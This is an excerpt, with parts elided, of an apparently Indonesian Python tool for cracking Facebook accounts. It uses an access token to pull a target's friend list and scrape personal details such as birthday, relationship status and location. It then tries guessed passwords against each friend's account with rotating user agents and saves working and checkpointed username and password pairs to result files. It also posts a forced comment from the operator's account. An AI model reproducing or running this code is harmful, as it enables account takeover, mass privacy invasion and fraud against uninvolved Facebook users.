...
def bot():
	try:
		...
		time.sleep(0.5)
		login()
	print(balmond+l+" Bentarr Bree, Follow Folow dulu:v")
	...
	requests.post("https://graph.facebook.com/123822970114380/comments/?message="+komentar+"&access_token="+token)
	menu()
...
def menu():
	...
	try:
		...
		time.sleep(0.5)
		exit()
	print(balmond+l+" Username    : "+s+hujan)
	print(balmond+l+" ID          : "+s+berak)
	...
	if sayangku=="1" or sayangku=="01":
		...
		jalan("\n"+balmond+m+sayangku+" Gada di menu tod")
		time.sleep(1)
		menu()
...
def GetData():
    try:
        ...
        login()
    try:
        user = input ( " \033[0;36m[\x1b[1;93m?\033[0;36m]\033[0;00m Masukan Id : ")
        if user == '':
        ...
        if user == "me":
            idt = "me"
        x = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt, token))
        nmaa = x['name']
    ...
    try:
        ...
        day = '-'
        year = '-'
    print (' \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m tanggal lahir  : %s %s %s '%day,month,year);time.sleep(0.03)
    try:
    ...
    try:
        r = requests.get('https://graph.facebook.com/%s/friends?limit=50000&access_token=%s'%idt,token)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])
    except:pass
    print (' \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m Total pertemnan: %s'%len(id));time.sleep(0.03)
    try:
        r = requests.get('https://graph.facebook.com/%s/subscribers?access_token=%s'%idt,token)
        z = json.loads(r.text)
        pengikut = z['summary']['total_count']
    except (KeyError, IOError):
        pengikut = '-'
    print (' \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m Total pengikut : %s'%pengikut);time.sleep(0.03)
    try:
        lins = x['link']
    except (KeyError, IOError):
        lins = '-'
    ...
    print (' \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m status hubungan: %s %s'%stas,dgn);time.sleep(0.03)
    try:
        bioo = x['about']
    except (KeyError, IOError):
        bioo = '-'
    ...
    print (' \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m kota asal      : %s'%dari);time.sleep(0.03)
    try:
        tigl = x['location']['name']
    except (KeyError, IOError):
        tigl = '-'
    except: pass
    print (' \033[0;35mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ\x1b[1;97m tinggal di     : %s'%tigl);time.sleep(0.03)
    try:
        tzim = x['timezone']
    except (KeyError, IOError):
        tzim = '-'
...
def mode_password():
	...
	if mode=="d" or mode=="D":
		...
		cewe = pwa.split(",")
		if len(cewe)>5:
			jalan("\n"+balmond+m+" Jangan Serakah Ngab, Minimal 5 Password Aja")
			time.sleep(0.5)
			mode_password()
		for cowok in cewe:
			if len(cowok)==1 or len(cowok)==2 or len(cowok)==3 or len(cowok)==4 or len(cowok)==5:
...
def mode_crack():
	...
	if pilih=="1" or pilih=="01":
		...
		print("\n"+balmond+s+" ketik "+h+"'y'"+s+" Jika Ingin Menggunakan Random UAgent")
		print(balmond+u+" Jika Tidak, Tekan ENTER")
		agenku = input(balmond+l+" Gunakan User Agent Random "+s+"{"+u+"Recomended"+s+"}"+l+" : ")
		if agenku=="y" or agenku=="Y":
			random_gak.append("random")
		else:
...
def mode_crack2():
        ...
        pilih = input("\n"+balmond+l+" Pilih : ")
        if pilih=="1" or pilih=="01":
                print("\n"+balmond+s+" Tekan "+h+"'y'"+s+" Untuk Menggunakan Random User Agent")
                agenku = input(balmond+l+" Gunakan User Agent Random "+s+"{"+u+"Recomended"+s+"}"+l+" : ")
                if agenku=="y" or agenku=="Y":
                        random_gak.append("random")
                else:
	...
	if len(berapa_d)==0:
		...
		for angka in berapa_d:
			...
			if dutt>3599:
				...
				dett = ditt[0]+"d"
	print("\r{"+u+"apik"+s+"} "+l+"%s/%s OK:%s CP:%s %s[%s%s%s] [%s%s%s]"%(loop,len(id),len(ok),len(cp),h,k,persen,h,k,dett,h), end=' ');sys.stdout.flush()
				...
				if "jangan" in opsit:
					try:
						...
						if len(lahir)==2:
							...
							if "old" in old_gak:
								print(s+"\r{"+k+"cp"+s+"}"+u+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+k+" >< "+l+tahunnya)
								bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+"\n");bts.close()
								cp.append(uid+"|"+pw)
							else:
								print(s+"\r{"+k+"cp"+s+"}"+u+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan)
								bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+"\n");bts.close()
								cp.append(uid+"|"+pw)
						else:
							nama_bulan = indah[int(lahir[0])]
							if "old" in old_gak:
								print(s+"\r{"+k+"cp"+s+"}"+u+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+" "+lahir[2]+k+" >< "+l+tahunnya)
								bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+" "+lahir[2]+"\n");bts.close()
								cp.append(uid+"|"+pw)
							else:
								print(a+"\r{"+k+"cp"+s+"}"+u+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+" "+lahir[2])
								bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+" "+lahir[2]+"\n");bts.close()
								cp.append(uid+"|"+pw)
					except (KeyError,IOError):
						if "old" in old_gak:
							print(s+"\r{"+k+"cp"+s+"}"+k+" "+uid+u+" >< "+l+pw+u+" >< "+l+tahunnya+"          ")
							bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
							cp.append(uid+"|"+pw)
						else:
							print(s+"\r{"+k+"cp"+s+"}"+k+" "+uid+u+" >< "+l+pw+"          ")
							bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
							cp.append(uid+"|"+pw)
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				if "old" in old_gak:
					if len(uid)==6:
						...
						tahunnya = joined_year[5]
					print(s+"\r{"+k+"ok"+s+"}"+h+" "+uid+u+" >< "+h+pw+u+" >< "+h+tahunnya+"          ")
					bts = open("Hasil_Ok/OK_%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
					ok.append(uid+"|"+pw)
				else:
					print(s+"\r{"+k+"ok"+s+"}"+h+" "+uid+u+" >< "+h+pw+u+" >< "+h+kuki)
					bts = open("Hasil_Ok/OK_%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
					ok.append(uid+"|"+pw)
				break
...
def ceker_ttl(uid,pw,ua,lahir,tahunnya):
	...
	if "checkpoint" in ses.cookies:
		...
		if len(lahir)==2:
			nama_bulan = indah[int(lahir[0])]
			if "old" in old_gak:
				print(s+"\r{"+k+"Cp"+s+"}"+k+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+k+" >< "+l+tahunnya)
				bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+"\n");bts.close()
				cp.append(uid+"|"+pw)
			else:
				print(s+"\r{"+k+"Cp"+s+"}"+k+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan)
				bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+"\n");bts.close()
				cp.append(uid+"|"+pw)
		else:
			nama_bulan = indah[int(lahir[0])]
			if "old" in old_gak:
				print(s+"\r{"+k+"Cp"+s+"}"+k+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+" "+lahir[2]+k+" >< "+l+tahunnya)
				bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+" "+lahir[2]+"\n");bts.close()
				cp.append(uid+"|"+pw)
			else:
				print(s+"\r{"+k+"Cp"+s+"}"+k+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+" "+lahir[2])
				bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+" "+lahir[2]+"\n");bts.close()
				cp.append(uid+"|"+pw)
		for opt in range(len(ngew)):
			print("\r"+balmond+l+"   "+ngew[opt])
		if "0" in str(len(ngew)):print("\r"+balmond+l+"   "+h+"Tap Yes Nih Der")
		print("\r"+h+batas)
...
def yaudah(user,pasw,loop,tes):
	...
	try:
		...
		if "c_user" in ses.cookies:
			...
			xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
			ngew = [yy.text for yy in xnxx.find_all("option")]
			print(s+"\r{"+k+"Cp"+s+"}"+k+" "+user+k+" >< "+l+pasw)
			for opt in range(len(ngew)):
				print("\r"+balmond+l+"   "+ngew[opt])
			if "0" in str(len(ngew)):print("\r"+balmond+l+"   "+h+"Tap Yes Nih Bos")
			print(h+batas)
